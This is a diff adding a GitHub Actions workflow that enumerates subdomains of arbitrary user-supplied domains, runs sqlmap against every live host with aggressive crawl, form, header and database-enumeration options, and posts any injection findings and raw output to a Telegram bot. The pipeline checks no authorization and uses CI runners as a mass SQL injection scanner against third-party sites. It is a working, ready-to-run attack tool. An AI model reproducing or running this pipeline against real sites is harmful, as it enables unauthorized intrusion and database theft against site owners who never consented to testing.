@@ -1,0 +1,138 @@
+name: Deep SQLMap Crawl & Test
+
+on:
+  workflow_dispatch:
+    inputs:
+      domains:
+        description: 'Domains separated by / (e.g., f.com/j.com/x.com)'
+        required: false
+        type: string
+      file_path:
+        description: 'Path to a domains .txt file in repo (one per line)'
+        required: false
+        type: string
+
+jobs:
+  sqlmap-deep:
+    runs-on: ubuntu-latest
+    env:
+      FORCE_JAVASCRIPT_ACTIONS_TO_NODE24: true
+    
+    steps:
+      - name: Checkout Code
+        uses: actions/checkout@v4
+
+      - name: Install Dependencies
+        run: |
+          sudo apt-get update && sudo apt-get install -y jq libpcap-dev zip
+          pip3 install sqlmap
+
+      - name: Install Go Tools
+        run: |
+          go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
+          go install github.com/projectdiscovery/httpx/cmd/httpx@latest
+          echo "$HOME/go/bin" >> $GITHUB_PATH
+
+      - name: Prepare Targets
+        env:
+          INPUT_PROMPTS: ${{ github.event.inputs.domains }}
+          INPUT_FILE: ${{ github.event.inputs.file_path }}
+        run: |
+          touch targets.txt
+          if [ -n "$INPUT_PROMPTS" ]; then
+            echo "$INPUT_PROMPTS" | tr '/' '\n' | tr -d '\r' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//' | grep -v '^$' >> targets.txt
+          fi
+          if [ -n "$INPUT_FILE" ] && [ -f "$INPUT_FILE" ]; then
+            cat "$INPUT_FILE" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//' | grep -v '^$' >> targets.txt
+          fi
+          sort -u targets.txt -o targets.txt
+
+      - name: Notify Telegram Start
+        env:
+          TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
+          TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
+        run: |
+          TARGET_COUNT=$(wc -l < targets.txt | xargs)
+          MESSAGE="🛢️ Deep SQLMap Pipeline Starting"$'\n'$'\n'"Domains: ${TARGET_COUNT}"$'\n'"Mode: Deep Crawl + Forms + Headers (Max 10min/URL)"
+          curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
+            -d chat_id="${TELEGRAM_CHAT_ID}" \
+            --data-urlencode "text=${MESSAGE}" || true
+
+      - name: Step 1 & 2 - Subfinder & Httpx
+        run: |
+          while IFS= read -r target; do
+            if [ -z "$target" ]; then continue; fi
+            safe_name=$(echo "$target" | sed 's/[^a-zA-Z0-9]/_/g' | cut -c 1-50)
+            SUBS="${{ github.workspace }}/${safe_name}_subs.txt"
+            LIVE="${{ github.workspace }}/${safe_name}_live.txt"
+            
+            echo ">>> Running Subfinder & Httpx for $target"
+            subfinder -d "$target" -o "$SUBS" || true
+            touch "$SUBS"
+            
+            if [ -s "$SUBS" ]; then
+              cat "$SUBS" | httpx -silent > "$LIVE" || true
+            else
+              touch "$LIVE"
+            fi
+            touch "$LIVE"
+          done < targets.txt
+
+      - name: Step 3 - Run SQLMap (Deep Crawl & Forms)
+        continue-on-error: true
+        env:
+          TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
+          TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
+        run: |
+          while IFS= read -r target; do
+            if [ -z "$target" ]; then continue; fi
+            safe_name=$(echo "$target" | sed 's/[^a-zA-Z0-9]/_/g' | cut -c 1-50)
+            LIVE="${{ github.workspace }}/${safe_name}_live.txt"
+            SQLMAP_OUT="${{ github.workspace }}/${safe_name}_sqlmap.txt"
+            
+            echo ">>> RUNNING SQLMAP FOR $target"
+            if [ ! -s "$LIVE" ]; then continue; fi
+            
+            > "$SQLMAP_OUT"
+            
+            # Read each live URL
+            while IFS= read -r url; do
+              if [ -z "$url" ]; then continue; fi
+              echo ">>> Crawling & Testing with SQLMap: $url"
+              
+              # Run SQLMap:
+              # --crawl=3: Automatically find pages/parameters up to depth 3
+              # --forms: Automatically test POST login boxes and inputs
+              # --level=3: Test Headers, Cookies, and User-Agent (simulates manual testing)
+              # --risk=2: Use heavier, more aggressive payloads
+              # --batch: Never ask for user input
+              # --timeout=15: Faster timeout per request
+              # Wrapped in 'timeout 600' (10 minutes max per URL to prevent hanging)
+              timeout 600 sqlmap -u "$url" --batch --random-agent --crawl=3 --forms --level=3 --risk=2 --dbs --timeout=15 --retries=2 >> "$SQLMAP_OUT" 2>&1 || true
+              
+            done < "$LIVE"
+            
+            # Send to Telegram
+            if [ -s "$SQLMAP_OUT" ] && grep -qi "is vulnerable\|injectable\|Parameter.*appears to be\|back-end DBMS\|available databases" "$SQLMAP_OUT"; then
+              curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
+                -d chat_id="${TELEGRAM_CHAT_ID}" \
+                --data-urlencode "text=🚨 SQLMap found SQLi for ${target}!" || true
+              curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument" \
+                -F chat_id="${TELEGRAM_CHAT_ID}" \
+                -F document="@${SQLMAP_OUT}" \
+                -F caption="🛢️ SQLMap Raw Output (Crawl+Forms) - ${target}" || true
+            else
+              curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
+                -d chat_id="${TELEGRAM_CHAT_ID}" \
+                --data-urlencode "text=✅ SQLMap found 0 SQLi for ${target}." || true
+            fi
+          done < targets.txt
+
+      - name: Pipeline Finished
+        env:
+          TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
+          TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
+        run: |
+          curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
+            -d chat_id="${TELEGRAM_CHAT_ID}" \
+            --data-urlencode "text=🛑 Deep SQLMap Pipeline Completely Finished" || true
